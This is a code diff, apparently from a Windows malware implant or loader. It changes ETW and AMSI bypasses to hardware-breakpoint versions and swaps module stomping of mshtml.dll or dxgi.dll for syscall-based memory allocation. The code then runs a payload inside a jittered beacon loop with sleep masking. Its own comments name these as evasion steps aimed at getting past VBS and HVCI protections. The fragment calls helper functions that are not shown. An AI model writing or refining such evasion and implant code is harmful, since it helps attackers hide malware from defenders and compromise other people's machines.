@@ -159,28 +159,31 @@ static void Run() {
     if (!InitializeAll()) return;
     if (!EnvironmentSafe()) { g_ShouldTerminate = TRUE; return; }
 
-    // Evasion steps
-    BypassETW();
-    BypassAMSI_DataOnly();
+    // Evasion steps (HWBP-based for VBS/HVCI compatibility)
+    BypassETW_HWBP();
+    BypassAMSI_HWBP();
 
-    // Stomp a legitimate module (dynamic choice)
-    STOMP_CONTEXT ctx = {0};
-    if (!ModuleStompAdvanced(OBFUSCATE(L"mshtml.dll"), 0x10000, &ctx)) {
-        if (!ModuleStompAdvanced(OBFUSCATE(L"dxgi.dll"), 0x10000, &ctx)) {
-            g_ShouldTerminate = TRUE; return;
-        }
+    // VBS-Safe allocation instead of Module Stomping
+    // (HVCI blocks writing to signed .text sections)
+    PVOID pTarget = NULL;
+    SIZE_T regionSize = 0x20000; // 128KB
+    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtAllocateVirtualMemory.ssn,
+        g_SyscallGadget, (HANDLE)-1, &pTarget, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (status != 0) {
+        g_ShouldTerminate = TRUE;
+        return;
     }
-    PVOID pTarget = (PBYTE)ctx.BaseAddress + ctx.TextSection->VirtualAddress;
 
     // Initial payload execution
-    ExecutePayload(pTarget, ctx.RegionSize);
+    ExecutePayload(pTarget, regionSize);
 
     // Beacon loop – configurable interval (default 60s) with jitter
     const DWORD baseInterval = 60000; // 1 minute
     while (!g_ShouldTerminate) {
         if (!EnvironmentSafe()) { g_ShouldTerminate = TRUE; break; }
-        AdvancedSleepMask(baseInterval, pTarget, ctx.RegionSize);
-        ExecutePayload(pTarget, ctx.RegionSize);
+        AdvancedSleepMask(baseInterval, pTarget, regionSize);
+        ExecutePayload(pTarget, regionSize);
     }
 }
 
